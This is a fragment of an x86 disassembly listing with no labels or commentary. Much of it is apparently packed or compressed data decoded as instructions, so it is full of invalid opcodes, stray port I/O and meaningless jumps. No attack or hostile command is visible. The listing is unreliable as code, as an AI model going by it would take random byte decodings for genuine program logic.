  42f90b:	in     al,0x2
  42f90d:	jg     0x42f945
  42f90f:	aaa    
  42f910:	nop
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9b3
  42f981:	ja     0x42f9f0
  42f983:	xchg   ebp,eax
  42f984:	lahf   
  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0x94000001,al
  42f98d:	pusha  
  42f98e:	test   eax,0x81996867
  42f993:	add    BYTE PTR [edx+0x2e02b56c],dh
  42f999:	dec    eax
  42f99a:	pop    esi
  42f99b:	icebp  
  42f99c:	adc    bh,ah
  42f99e:	inc    ecx
  42f99f:	inc    ebx
  42f9a0:	fsubp  st(3),st
  42f9a2:	loope  0x42f98d
  42f9a4:	or     dh,bl
  42f9a6:	ret    0x28a
  42f9a9:	fnop   
  42f9ab:	mov    esp,0xf27bc732
  42f9b0:	out    0x75,eax
  42f9b2:	xor    BYTE PTR [edx-0x59],bl
  42f9b5:	pop    eax
  42f9b6:	xor    edx,edx
  42f9b8:	clc    
  42f9b9:	jl     0x42f9fe
  42f9bb:	inc    esi
  42f9bc:	stos   DWORD PTR es:[edi],eax
  42f9bd:	sub    dl,bh
  42f9bf:	adc    eax,0x745edda7
  42f9c4:	sub    ebp,ecx
  42f9c6:	inc    esi
  42f9c7:	inc    esp
  42f9c8:	cmc    
  42f9c9:	and    ebp,esp
  42f9cb:	xchg   ebx,eax
  42f9cc:	loopne 0x42f9ef
  42f9ce:	jmp    0x42fa4a
  42f9d0:	cli    
  42f9d1:	jne    0x42f955
  42f9d3:	or     al,BYTE PTR [edx]
  42f9d5:	shl    BYTE PTR [ebp+0x1524617],1
  42f9db:	jecxz  0x42f9bb
  42f9dd:	and    bh,BYTE PTR [eax-0x4a]
  42f9e0:	arpl   si,cx
  42f9e2:	fcom   st(0)
  42f9e4:	xor    DWORD PTR [ecx],ebx
  42f9e6:	lea    edi,[esp+ecx*1]
  42f9e9:	in     eax,0xa7
  42f9eb:	mov    cl,0x87
  42f9ed:	or     BYTE PTR [edx-0x7c],ch
  42f9f0:	bound  eax,QWORD PTR [ebp-0x7c]
  42f9f3:	loope  0x42f9e7
  42f9f5:	pop    esp
  42f9f6:	lahf   
  42f9f7:	in     eax,dx
  42f9f8:	inc    ecx
  42f9f9:	cmp    eax,0x1ff57a42
  42f9fe:	jbe    0x42fa5e
  42fa00:	repnz push ecx
  42fa02:	mov    esp,DWORD PTR [eax+0x1d0ead01]
  42fa08:	or     bh,BYTE PTR [ebx-0x60c4dc67]
  42fa0e:	and    eax,DWORD PTR [ecx+ebx*8+0x36a07]
  42fa15:	(bad)  
  42fa16:	pop    ecx
  42fa17:	ins    DWORD PTR es:[edi],dx
  42fa18:	fist   WORD PTR [eax+0x6a38c844]
  42fa1e:	mov    ah,0x1e
  42fa20:	mov    al,0xf3
  42fa22:	xor    bh,BYTE PTR [edx+0x3]
  42fa25:	sub    al,0x72
  42fa27:	add    DWORD PTR [ebx-0x12],ecx
  42fa2a:	jnp    0x42fa75
  42fa2c:	scas   al,BYTE PTR es:[edi]
  42fa2d:	imul   edi,edx,0x96a45aaa
  42fa33:	pop    ecx
  42fa34:	sbb    edx,esp
  42fa36:	in     eax,dx
  42fa37:	aam    0xf5
  42fa39:	fs pop edi
  42fa3b:	pop    ebx
  42fa3c:	shl    DWORD PTR [eax-0x165de5c2],cl
  42fa42:	pop    esi
  42fa43:	push   ss
  42fa44:	or     ebx,DWORD PTR ds:0x7ab07842
  42fa4a:	sub    dl,BYTE PTR [ebx+0x29]
  42fa4d:	enter  0x7446,0xe
  42fa51:	mov    WORD PTR [edi],cs
  42fa53:	es push ecx
  42fa55:	repz or ecx,DWORD PTR [esp+ebx*1]
  42fa59:	and    ecx,DWORD PTR [edx-0x88d4661]
  42fa5f:	cwde   
  42fa60:	jne    0x42fa87
  42fa62:	outs   dx,DWORD PTR ds:[esi]
  42fa63:	xchg   edx,eax
  42fa64:	sar    DWORD PTR [ebp-0x2627733d],1
  42fa6a:	repnz clc 
  42fa6c:	mov    ebx,0xe695af5a
  42fa71:	mov    dl,0xcf
  42fa73:	shl    BYTE PTR [edi+edx*2],1
  42fa76:	in     eax,0xf6
  42fa78:	xchg   edi,eax
  42fa79:	stc    
  42fa7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa7b:	mov    edx,DWORD PTR [ebx+0x2d8be49e]
  42fa81:	aaa    
  42fa82:	inc    ebp
  42fa83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa84:	mov    eax,ds:0x7dd4018e
  42fa89:	push   esi
  42fa8a:	loop   0x42fa51
  42fa8c:	inc    edi
  42fa8d:	xchg   ebp,eax
  42fa8e:	jnp    0x42fab4
  42fa90:	mov    eax,0x0
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	neg    DWORD PTR [esi+0x23]
  42fb03:	xchg   esi,eax
  42fb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0xaa000001,al
  42fb0d:	pop    eax
  42fb0e:	scas   eax,DWORD PTR es:[edi]
  42fb0f:	cmp    dl,ch
  42fb11:	clc    
  42fb12:	stos   DWORD PTR es:[edi],eax
  42fb13:	mov    cs,WORD PTR [edi-0x65]
  42fb16:	dec    ecx
  42fb17:	pop    esi
  42fb18:	sbb    eax,0x27a4c97d
  42fb1d:	sbb    esp,eax
  42fb1f:	repz push esi
  42fb21:	xchg   ebx,eax
  42fb22:	inc    ebx
  42fb23:	(bad)  
  42fb24:	sbb    al,0x67
  42fb26:	stos   DWORD PTR es:[edi],eax
  42fb27:	pop    ecx
  42fb28:	pop    edx
  42fb29:	iret   
  42fb2a:	mov    dl,BYTE PTR [eax]
  42fb2c:	inc    esi
  42fb2d:	xor    BYTE PTR [esi-0x7809c155],0xc3
  42fb34:	pop    edi
  42fb35:	jbe    0x42fae9
  42fb37:	loopne 0x42fb48
  42fb39:	rol    BYTE PTR [edx],1
  42fb3b:	inc    ebp
  42fb3c:	add    edi,esp
  42fb3e:	sub    al,0x4b
  42fb40:	int3   
  42fb41:	popf   
  42fb42:	pop    esp
  42fb43:	pop    ebx
  42fb44:	jecxz  0x42fad8
  42fb46:	add    al,0x2c
  42fb48:	mov    cl,0x49
  42fb4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb4b:	in     al,0x3d
  42fb4d:	add    DWORD PTR [esi+0x73bd1b4],esp
  42fb53:	push   0xf
  42fb55:	or     al,BYTE PTR [ebx]
  42fb57:	ja     0x42fb62
  42fb59:	out    0xa5,al
  42fb5b:	fwait
  42fb5c:	gs add al,0xa2
  42fb5f:	and    BYTE PTR [ebp+edx*1-0x2a],0x52
  42fb64:	es xchg ecx,eax
  42fb66:	dec    ebp
  42fb67:	inc    eax
  42fb68:	shl    edi,1
  42fb6a:	mov    ch,0xf6
  42fb6c:	add    BYTE PTR [edi-0x2e],bl
  42fb6f:	xchg   ebp,eax
  42fb70:	mov    ebp,0xc9e8fe76
  42fb75:	pop    ebp
  42fb76:	ficomp DWORD PTR [edi-0x451a7bb5]
  42fb7c:	xchg   ebx,eax
  42fb7d:	cmp    eax,0xaf1359ab
  42fb82:	and    BYTE PTR cs:[esi],ch
  42fb85:	xchg   DWORD PTR [ecx],edx
  42fb87:	push   ebp
  42fb88:	fidivr WORD PTR [edx]
  42fb8a:	pop    ebx
  42fb8b:	pop    ss
  42fb8c:	stc    
  42fb8d:	out    dx,eax
  42fb8e:	pop    eax
  42fb8f:	mov    ecx,0x58a02d43
  42fb94:	ss push ecx
  42fb96:	push   0x6c484320
  42fb9b:	outs   dx,BYTE PTR ds:[esi]
  42fb9c:	mov    esi,cs
  42fb9e:	repnz pop esp
  42fba0:	xor    eax,ecx
  42fba2:	ret    0x8f5
  42fba5:	push   ebx
  42fba6:	test   al,0x99
  42fba8:	mov    ds:0xcfe52bd8,eax
  42fbad:	fcomp  DWORD PTR [ebx]
  42fbaf:	xchg   ecx,eax
  42fbb0:	lock sti 
  42fbb2:	repnz lahf 
  42fbb4:	dec    esi
  42fbb5:	pop    esp
  42fbb6:	enter  0x5e9a,0xb8
  42fbba:	mov    ebx,0x5c726352
  42fbbf:	mov    al,0x61
  42fbc1:	fcomp  QWORD PTR [ecx+0x29]
  42fbc4:	js     0x42fc08
  42fbc6:	daa    
  42fbc7:	jo     0x42fbe9
  42fbc9:	bound  edi,QWORD PTR [esi]
  42fbcb:	fdiv   DWORD PTR ss:[edx+0xd]
  42fbcf:	je     0xd5c18f4
  42fbd5:	lea    ebp,[edx]
  42fbd7:	push   cs
  42fbd8:	xor    BYTE PTR [ecx-0x15],bl
  42fbdb:	xor    al,0x69
  42fbdd:	mov    cl,0xd2
  42fbdf:	mov    bl,0x85
  42fbe1:	imul   esp,DWORD PTR [edx+0x35],0xe39dbd8e
  42fbe8:	inc    esp
  42fbe9:	or     DWORD PTR [eax],ebx
  42fbeb:	jne    0x42fbf5
  42fbed:	lods   eax,DWORD PTR ds:[esi]
  42fbee:	sub    ebp,DWORD PTR [eax-0xb]
  42fbf1:	out    dx,al
  42fbf2:	fwait
  42fbf3:	inc    ecx
  42fbf4:	adc    dl,BYTE PTR [ecx+0x34]
  42fbf7:	in     eax,dx
  42fbf8:	pop    edi
  42fbf9:	(bad)  
  42fbfa:	mov    ?,ebx
  42fbfc:	sub    eax,0x344bb753
  42fc01:	cmp    eax,DWORD PTR [ecx]
  42fc03:	scas   al,BYTE PTR es:[edi]
  42fc04:	sar    DWORD PTR [ecx+0x590e6ea3],cl
  42fc0a:	pushf  
  42fc0b:	jnp    0x42fc6f
  42fc0d:	inc    esi
  42fc0e:	and    DWORD PTR [ecx],edx
  42fc10:	mov    eax,ds:0x0
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x3e11:0x2036325e
  42fc82:	or     al,0x13
  42fc84:	test   eax,0x5000200
  42fc89:	add    DWORD PTR [eax],eax
  42fc8b:	add    BYTE PTR [edi-0xe],cl
  42fc8e:	enter  0xb613,0xd3
  42fc92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc93:	je     0x42fc82
  42fc95:	sbb    cl,BYTE PTR [ebx]
  42fc97:	sub    DWORD PTR [esi],eax
  42fc99:	mov    bl,0xf8
  42fc9b:	rcr    DWORD PTR [esi+esi*8+0x1df83a95],1
  42fca2:	out    0x23,al
  42fca4:	jl     0x42fcec
  42fca6:	imul   edi,DWORD PTR [edi+ebp*2],0xffffffd6
  42fcaa:	mov    dh,0x96
  42fcac:	adc    al,0xad
  42fcae:	xor    eax,0x70aae536
  42fcb3:	pop    edx
  42fcb4:	or     BYTE PTR [eax+esi*1+0x3ac3f65b],bl
  42fcbb:	mov    ebp,fs
  42fcbd:	fmul   DWORD PTR [edx+0x44]
  42fcc0:	inc    esp
  42fcc1:	xchg   edi,eax
  42fcc2:	xor    bh,BYTE PTR [ebx+0x3d4bfb25]
  42fcc8:	in     eax,0x12
  42fcca:	push   0xf705a3f8
  42fccf:	loop   0x42fcd0
  42fcd1:	sbb    BYTE PTR [ecx],0x22
  42fcd4:	cli    
  42fcd5:	push   edi
  42fcd6:	scas   al,BYTE PTR es:[edi]
  42fcd7:	call   0x914a:0xed326733
  42fcde:	mov    edx,DWORD PTR [eax-0x65]
  42fce1:	jmp    0x1916:0xded24992
  42fce8:	bound  ecx,QWORD PTR ds:0xe83b561d
  42fcee:	mov    BYTE PTR es:[esi-0x3b05964c],cl
  42fcf5:	sahf   
  42fcf6:	jl     0x42fc81
  42fcf8:	pop    ss
  42fcf9:	push   esp
  42fcfa:	jmp    0xa1f9c4cc
  42fcff:	inc    esp
  42fd00:	adc    DWORD PTR [ebx+0x3f0bbc1a],eax
  42fd06:	mov    ah,0xa0
  42fd08:	jg     0x42fd89
  42fd0a:	scas   al,BYTE PTR es:[edi]
  42fd0b:	stos   DWORD PTR es:[edi],eax
  42fd0c:	mov    bl,0xb0
  42fd0e:	adc    DWORD PTR [ecx-0x5f827b28],esi
  42fd14:	add    edx,edx
  42fd16:	xor    dl,cl
  42fd18:	push   esp
  42fd19:	ret    
  42fd1a:	mov    dh,0xa3
  42fd1c:	mov    al,0x3b
  42fd1e:	push   esi
  42fd1f:	pop    ds
  42fd20:	jmp    0x1eaa9a
  42fd25:	cs in  eax,0x79
  42fd28:	icebp  
  42fd29:	cwde   
  42fd2a:	inc    ebp
  42fd2b:	stc    
  42fd2c:	in     al,0xad
  42fd2e:	jg     0x42fd6c
  42fd30:	lods   eax,DWORD PTR ds:[esi]
  42fd31:	mov    edi,ds
  42fd33:	jno    0x42fd3b
  42fd35:	mov    dh,0x1
  42fd37:	and    esi,ebp
  42fd39:	mov    eax,0x574ef6a9
  42fd3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd3f:	ds ret 
  42fd41:	pop    eax
  42fd42:	shr    BYTE PTR [eax-0x5f6f0543],1
  42fd48:	aas    
  42fd49:	mov    ebp,0x4518d7d0
  42fd4e:	add    al,0x28
  42fd50:	add    eax,ebp
  42fd52:	inc    ebx
  42fd53:	imul   BYTE PTR [ecx-0x13]
  42fd56:	fcomp  DWORD PTR [eax+eax*8-0x4f]
  42fd5a:	and    dl,ah
  42fd5c:	cmc    
  42fd5d:	mov    dl,0xd8
  42fd5f:	out    dx,eax
  42fd60:	xor    eax,0x1167f820
  42fd65:	push   ds
  42fd66:	(bad)  
  42fd68:	cli    
  42fd69:	jbe    0x42fcf4
  42fd6b:	or     DWORD PTR [esi*2-0x43595f03],0x538444d
  42fd76:	mov    edi,0x6d7482ca
  42fd7b:	popf   
  42fd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd7d:	clc    
  42fd7e:	add    dh,ch
  42fd80:	fxch   st(0)
  42fd82:	ret    
  42fd83:	xchg   BYTE PTR [edi-0x29732468],ch
  42fd89:	pusha  
  42fd8a:	sub    bl,BYTE PTR [edx]
  42fd8c:	mov    edx,0xe24ed75a
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz xor al,0x9d
  42fe02:	cmp    eax,0x201ae7f
  42fe07:	add    BYTE PTR ds:0x9f000001,al
  42fe0d:	pop    ds
  42fe0e:	xor    DWORD PTR [ecx-0x258452aa],eax
  42fe14:	mov    dh,0x38
  42fe16:	inc    ebp
  42fe17:	mov    bh,0xe2
  42fe19:	fcmovu st,st(7)
  42fe1b:	std    
  42fe1c:	sbb    edx,edx
  42fe1e:	mov    fs,ecx
  42fe20:	mov    esp,0x698d95ed
  42fe25:	inc    BYTE PTR [ebp-0x7]
  42fe28:	sbb    BYTE PTR [edi+0x62a7a4d7],cl
  42fe2e:	inc    esi
  42fe2f:	mov    bl,0xae
  42fe31:	mov    ebx,0x67253967
  42fe36:	push   0x33
  42fe38:	xor    BYTE PTR [ebx+eax*8+0x7c207ec7],0xa0
  42fe40:	inc    esp
  42fe41:	out    0x24,eax
  42fe43:	mov    ecx,DWORD PTR [edi]
  42fe45:	int3   
  42fe46:	rcl    edx,cl
  42fe48:	stos   BYTE PTR es:[edi],al
  42fe49:	sbb    ch,cl
  42fe4b:	or     eax,0x9912ba8a
  42fe50:	popf   
  42fe51:	paddw  mm4,QWORD PTR [edi]
  42fe54:	mov    edi,0x52e5c54a
  42fe59:	pop    esp
  42fe5a:	cdq    
  42fe5b:	stc    
  42fe5c:	imul   esp,DWORD PTR [ecx-0x64ced8a3],0x444138c3
  42fe66:	stos   DWORD PTR es:[edi],eax
  42fe67:	or     eax,0x85e3d1c2
  42fe6c:	xor    eax,0xd00c4a8f
  42fe71:	inc    edx
  42fe72:	or     ah,BYTE PTR [edx-0x13]
  42fe75:	add    al,0xe0
  42fe77:	xchg   esi,eax
  42fe78:	stos   DWORD PTR es:[edi],eax
  42fe79:	or     al,BYTE PTR [eax-0x1a7309cf]
  42fe7f:	or     bl,ah
  42fe81:	stos   BYTE PTR es:[edi],al
  42fe82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe83:	das    
  42fe84:	push   ebx
  42fe85:	shl    DWORD PTR [eax+0x361cb1c5],1
  42fe8b:	push   esp
  42fe8c:	shr    DWORD PTR ds:0x502a0edd,1
  42fe92:	test   BYTE PTR [eax+edi*4],ah
  42fe95:	fild   WORD PTR [edi]
  42fe97:	push   edx
  42fe98:	xor    ch,dl
  42fe9a:	xor    al,0xba
  42fe9c:	mov    ch,0xea
  42fe9e:	out    0x68,al
  42fea0:	lods   al,BYTE PTR ds:[si]
  42fea2:	inc    ecx
  42fea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fea4:	or     DWORD PTR [edi+0x65470d6d],edi
  42feaa:	adc    ebx,DWORD PTR [esi+0x55ee6675]
  42feb0:	sti    
  42feb1:	fptan  
  42feb3:	xor    al,0xd8
  42feb5:	pop    ds
  42feb6:	(bad)  
  42feb7:	int3   
  42feb8:	mov    cs,WORD PTR [esi]
  42feba:	imul   edi,DWORD PTR [eax],0xffffffdd
  42febd:	adc    eax,0x99ce2461
  42fec2:	xor    ah,BYTE PTR [ecx+0x4fe6763e]
  42fec8:	mov    cl,0x91
  42feca:	mov    eax,0x7f6aba16
  42fecf:	push   ecx
  42fed0:	pop    ss
  42fed1:	outs   dx,BYTE PTR ds:[esi]
  42fed2:	add    eax,edi
  42fed4:	mov    eax,ds:0xeb6de663
  42fed9:	(bad)  
  42feda:	jmp    0xa8da:0x5eb58678
  42fee1:	adc    eax,0xd0c87a02
  42fee6:	les    ebx,FWORD PTR [edi+ebx*2-0x3c3efc9f]
  42feed:	adc    DWORD PTR [esi+edi*4+0x204c0645],esi
  42fef4:	sub    esi,DWORD PTR [edx-0x61b1b7a8]
  42fefa:	mov    edi,0xde234c12
  42feff:	mov    dl,0x5b
  42ff01:	test   ebp,ebx
  42ff03:	cdq    
  42ff04:	clc    
  42ff05:	mov    bl,0xe7
  42ff07:	sbb    bh,bh
  42ff09:	pop    edi
  42ff0a:	sub    eax,0xa18167f2
  42ff0f:	mov    ah,0x15
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [eax+esi*2+0x73],0x83
  42ff83:	pop    eax
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	mov    dh,0x0
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	inc    ecx
  42ff8d:	fidivr DWORD PTR [edi]
  42ff8f:	lds    ebx,FWORD PTR [ebx-0x3]
  42ff92:	inc    eax
  42ff93:	cmp    BYTE PTR [edx+0x15],ch
  42ff96:	in     eax,0x5
  42ff98:	outs   dx,BYTE PTR ds:[esi]
  42ff99:	jp     0x42ff65
  42ff9b:	fcmovnu st,st(2)
  42ff9d:	and    BYTE PTR [eax-0x2c],bl
  42ffa0:	add    bl,BYTE PTR [edi+0x23]
  42ffa3:	pop    ds
  42ffa4:	shl    BYTE PTR [ecx],1
  42ffa6:	jne    0x430023
  42ffa8:	mov    ebx,0x710d9714
  42ffad:	in     al,dx
  42ffae:	mov    ah,0x87
  42ffb0:	test   dl,dl
  42ffb2:	dec    esi
  42ffb3:	std    
  42ffb4:	scas   eax,DWORD PTR es:[edi]
  42ffb5:	imul   edi,ecx,0xffffffa7
  42ffb8:	xchg   ecx,eax
  42ffb9:	in     eax,0x71
  42ffbb:	pusha  
  42ffbc:	push   ebx
  42ffbd:	jge    0x430023
  42ffbf:	and    DWORD PTR [ebx+edi*2],eax
  42ffc2:	sahf   
  42ffc3:	call   0x538b1a74
  42ffc8:	inc    eax
  42ffc9:	mov    ah,0xf7
  42ffcb:	adc    DWORD PTR ss:[ebp-0x31],ecx
  42ffcf:	add    edi,DWORD PTR [ebx-0x53eb242c]
  42ffd5:	inc    ebx
  42ffd6:	mov    BYTE PTR [ebp+0x7d1d84dd],dh
  42ffdc:	(bad)  
  42ffdd:	fdivr  QWORD PTR [edi-0x67ca38e8]
  42ffe3:	fwait
  42ffe4:	jns    0x42ffed
  42ffe6:	in     eax,dx
  42ffe7:	dec    ecx
  42ffe8:	jg     0x43005d
  42ffea:	popa   
  42ffeb:	cdq    
  42ffec:	mul    BYTE PTR [ebx-0x80]
  42ffef:	ret    
  42fff0:	mov    WORD PTR [ecx+ebp*1],?
  42fff3:	ds callw 0x85c8
  42fff8:	(bad)  
  42fff9:	(bad)  
  42fffa:	adc    BYTE PTR [esi],dl
  42fffc:	mov    al,0x25
  42fffe:	rcr    bl,cl
  430000:	xor    ecx,0xc5737481
  430006:	inc    esp
  430007:	jae    0x430043
  430009:	pop    edx
  43000a:	and    dh,BYTE PTR ds:[ebx+ebp*2+0x44]
  43000f:	inc    edx
  430010:	cli    
  430011:	jmp    0xc0312055
  430016:	dec    esp
  430017:	adc    eax,0xd76667c0
  43001c:	(bad)  
  43001d:	fsub   DWORD PTR [esi-0x49]
  430020:	int3   
  430021:	mov    al,0xc7
  430023:	ja     0x430067
  430025:	add    eax,0x7d5ca945
  43002a:	out    dx,eax
  43002b:	imul   esi,DWORD PTR [edi+0x4e],0xe52f55ca
  430032:	dec    ebp
  430033:	push   es
  430034:	mov    edi,DWORD PTR [edx+0x229cfdb7]
  43003a:	push   edx
  43003b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43003c:	repz mov ah,0x8a
  43003f:	arpl   WORD PTR [ebp+0x8],cx
	...
  430071:	add    BYTE PTR [eax],al
  430073:	add    BYTE PTR [ebp+0x55],cl
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
